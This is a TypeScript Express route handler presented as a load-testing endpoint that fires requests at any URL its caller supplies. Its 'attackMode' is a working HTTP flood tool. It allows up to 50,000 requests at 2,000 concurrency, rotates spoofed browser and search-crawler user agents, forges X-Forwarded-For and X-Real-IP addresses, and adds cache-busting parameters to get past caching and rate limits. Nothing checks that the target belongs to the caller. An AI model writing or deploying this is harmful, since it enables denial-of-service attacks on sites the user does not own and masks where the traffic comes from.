import { Request, Response } from "express";

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
  "curl/7.88.1",
  "python-requests/2.31.0",
  "Wget/1.21.4 (linux-gnu)",
  "Go-http-client/2.0",
  "axios/1.6.2",
  "okhttp/4.11.0",
  "Apache-HttpClient/4.5.14 (Java/17.0.9)",
  "libwww-perl/6.72",
  "Java/17.0.9",
  "Ruby/3.2.2",
];

const ACCEPT_HEADERS = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "application/json, text/plain, */*",
  "*/*",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
  "application/json",
  "text/plain;q=0.9,*/*;q=0.8",
];

const METHODS = ["GET", "GET", "GET", "GET", "HEAD", "HEAD"];

function randomItem<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function buildUrl(base: string, attackMode: boolean): string {
  if (!attackMode) return base;
  try {
    const u = new URL(base);
    u.searchParams.set("_cb", Math.random().toString(36).slice(2));
    u.searchParams.set("_t", Date.now().toString());
    return u.toString();
  } catch {
    return base;
  }
}

interface RequestResult {
  success: boolean;
  responseTime: number;
  statusCode?: number;
  error?: string;
}

async function performRequest(url: string, attackMode: boolean, timeoutMs: number): Promise<RequestResult> {
  const startTime = Date.now();
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);

  const headers: Record<string, string> = attackMode
    ? {
        "User-Agent": randomItem(USER_AGENTS),
        "Accept": randomItem(ACCEPT_HEADERS),
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Connection": "keep-alive",
        "X-Forwarded-For": `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
        "X-Real-IP": `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
        "Referer": `https://www.google.com/search?q=${Math.random().toString(36).slice(2)}`,
      }
    : {
        "User-Agent": "StressTest/2.0 (Load Testing Tool)",
        "Accept": "*/*",
        "Connection": "keep-alive",
      };

  const method = attackMode ? randomItem(METHODS) : "GET";
  const targetUrl = buildUrl(url, attackMode);

  try {
    const response = await fetch(targetUrl, { method, headers, signal: controller.signal });
    clearTimeout(timer);
    const responseTime = Date.now() - startTime;
    return {
      success: response.ok,
      responseTime,
      statusCode: response.status,
      error: response.ok ? undefined : `HTTP ${response.status} ${response.statusText}`,
    };
  } catch (error: any) {
    clearTimeout(timer);
    return {
      success: false,
      responseTime: Date.now() - startTime,
      error: error?.name === "AbortError"
        ? `Timed out after ${timeoutMs}ms`
        : (error?.message || "Network error"),
    };
  }
}

async function runTest(
  url: string,
  totalRequests: number,
  concurrentRequests: number,
  attackMode: boolean,
  timeoutMs: number
) {
  const results: RequestResult[] = [];
  const errors: string[] = [];
  const testStartTime = Date.now();
  let sent = 0;
  let completed = 0;

  const worker = async () => {
    while (true) {
      const myIndex = sent++;
      if (myIndex >= totalRequests) return;
      const result = await performRequest(url, attackMode, timeoutMs);
      results.push(result);
      completed++;
      if (!result.success && result.error && errors.length < 100) {
        errors.push(`#${myIndex + 1}: ${result.error}`);
      }
    }
  };

  const workers = Array.from({ length: Math.min(concurrentRequests, totalRequests) }, worker);
  await Promise.all(workers);

  const totalDuration = (Date.now() - testStartTime) / 1000;
  const successfulRequests = results.filter((r) => r.success).length;
  const failedRequests = results.length - successfulRequests;
  const responseTimes = results.map((r) => r.responseTime);
  const avgResponseTime = responseTimes.reduce((a, b) => a + b, 0) / (responseTimes.length || 1);

  const statusCodes: Record<string, number> = {};
  results.forEach((r) => {
    const code = r.statusCode ? String(r.statusCode) : "network_error";
    statusCodes[code] = (statusCodes[code] || 0) + 1;
  });

  return {
    totalRequests: results.length,
    successfulRequests,
    failedRequests,
    averageResponseTime: Math.round(avgResponseTime),
    minResponseTime: responseTimes.length ? Math.min(...responseTimes) : 0,
    maxResponseTime: responseTimes.length ? Math.max(...responseTimes) : 0,
    requestsPerSecond: Number((results.length / (totalDuration || 1)).toFixed(2)),
    totalDurationSeconds: Number(totalDuration.toFixed(2)),
    successRate: Number(((successfulRequests / (results.length || 1)) * 100).toFixed(1)),
    statusCodes,
    errors: errors.slice(0, 100),
    attackMode,
  };
}

export async function loadTesting(req: Request, res: Response) {
  const { url, totalRequests, concurrentRequests, attackMode } = req.body;

  if (!url) return res.status(400).json({ error: "URL is required" });
  try { new URL(url); } catch { return res.status(400).json({ error: "Invalid URL format" }); }

  const isAttack = Boolean(attackMode);

  const maxTotal = isAttack ? 50000 : 10000;
  const maxConcurrent = isAttack ? 2000 : 500;
  const timeoutMs = isAttack ? 5000 : 30000;

  const safeTotal = Math.min(Math.max(1, totalRequests || 100), maxTotal);
  const safeConcurrent = Math.min(Math.max(1, concurrentRequests || 10), maxConcurrent);

  if (safeConcurrent > safeTotal)
    return res.status(400).json({ error: "Concurrent requests cannot exceed total requests" });

  try {
    const results = await runTest(url, safeTotal, safeConcurrent, isAttack, timeoutMs);
    return res.json(results);
  } catch (error: any) {
    console.error("Load test error:", error);
    return res.status(500).json({ error: error?.message || "Load test failed" });
  }
}
